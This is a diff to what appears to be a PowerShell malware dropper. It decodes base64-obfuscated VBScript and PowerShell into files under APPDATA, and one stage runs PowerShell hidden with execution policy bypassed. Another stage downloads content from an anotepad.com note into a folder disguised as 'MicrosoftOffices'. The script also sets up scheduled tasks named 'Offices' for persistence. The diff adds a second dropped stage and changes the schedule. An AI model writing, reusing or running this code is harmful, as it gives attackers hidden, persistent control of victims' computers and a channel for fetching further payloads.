@@ -1,5 +1,6 @@
 ######  VB File  #####
-$filepath1 = $env:APPDATA + "\settings.in"
+$filepath = $env:APPDATA + "\settings.in"
+$filepath1 = $env:APPDATA + "\stick.in"
 ######  PS1 (vb) File  #####
 $filepath2 = $env:APPDATA + "\settings.ps1"
 ######  Ps1 (else) File  #####
@@ -10,8 +11,12 @@ Remove-Item -path $filepath2 -Force
 
 $res  = [System.Convert]::FromBase64String("U2V0IHdTaGVsbD1DcmVhdGVPYmplY3QoIldTY3JpcHQuU2hlbGwiKQ0KZmFybiA9IHdTaGVsbC5FeHBhbmRFbnZpcm9ubWVudFN0cmluZ3MoIiVhcHBkYXRhJSIpDQoNCm93dyA9IHNhcG9qZGtzaiArICJcc2V0dGluZ3MucHMxIg0KcGF0aCA9ICJwb3dlcnNoZWxsLmV4ZSAtZXhlY3V0aW9ucG9saWN5IGJ5cGFzcyAtRmlsZSAiICsgb3d3DQoNCndTaGVsbC5SdW4gcGF0aCwgMA0K")
 $r=[System.Text.Encoding]::UTF8.GetString($res)
+$r >> $filepath
+
+$res  = [System.Convert]::FromBase64String("U2V0IHdTaGVsbD1DcmVhdGVPYmplY3QoIldTY3JpcHQuU2hlbGwiKQ0KZmFybiA9IHdTaGVsbC5FeHBhbmRFbnZpcm9ubWVudFN0cmluZ3MoIiVhcHBkYXRhJSIpDQoNCm93dyA9IHNhcG9qZGtzaiArICJcc3RpY2sucHMxIg0KcGF0aCA9ICJwb3dlcnNoZWxsLmV4ZSAtZXhlY3V0aW9ucG9saWN5IGJ5cGFzcyAtRmlsZSAiICsgb3d3DQoNCndTaGVsbC5SdW4gcGF0aCwgMA==")
+$r=[System.Text.Encoding]::UTF8.GetString($res)
 $r >> $filepath1
-	
+
 $res  = [System.Convert]::FromBase64String("JHVybCA9ICJodHRwczovL2Fub3RlcGFkLmNvbS9ub3Rlcy84aDY0OXBxZyINCiRhdHR3ZSA9IGdldC1yYW5kb20gMTAwMDAwMDAwDQokb3V0cHV0UGF0aCA9ICIkZW52OmFwcGRhdGEvTWljcm9zb2Z0T2ZmaWNlcyINCklmICgtbm90IChUZXN0LVBhdGggJG91dHB1dFBhdGgpKSB7DQogICAgTmV3LUl0ZW0gLUl0ZW1UeXBlIERpcmVjdG9yeSAtUGF0aCAkb3V0cHV0UGF0aCB8IE91dC1OdWxsDQp9DQpJbnZva2UtV2ViUmVxdWVzdCAtVXJpICR1cmwgLU91dEZpbGUgIiRvdXRwdXRQYXRoXCRhdHR3ZSIgLVVzZUJhc2ljUGFyc2luZw0KJGE9KEdldC1JdGVtIC1QYXRoICIkb3V0cHV0UGF0aFwkYXR0d2UiKS5MZW5ndGgNCnNjIC1wYXRoICIkb3V0cHV0UGF0aFxsZW4iICRhDQo=")
 $r=[System.Text.Encoding]::UTF8.GetString($res)
 $r >> $filepath2
@@ -20,14 +25,12 @@ $res  = [System.Convert]::FromBase64String("JGxza2QgPSBHZXQtQ2hpbGRJdGVtIC1QYXRo
 $r=[System.Text.Encoding]::UTF8.GetString($res)
 $r >> $filepath3
 
-$ws = "wscript //e:vbscript " + $filepath1
-$ws1 = "wscript //e:vbscript " + $filepath2
+$ws = "wscript //e:vbscript " + $filepath
+$ws1 = "wscript //e:vbscript " + $filepath1
 
-schtasks /create /tn "Offices" /tr $ws /mo 50 /ru System /F
-schtasks /create /tn "Offices" /tr $ws1 /mo 50 /ru System /F
-
+schtasks /create /tn "Offices" /sc minute /tr $ws /mo 50 /F
+schtasks /create /tn "Offices" /sc minute /tr $ws1 /mo 50 /F
 
 schtasks /run /tn "Offices"
 sleep 5
 schtasks /run /tn "OfficeUpdate"
-
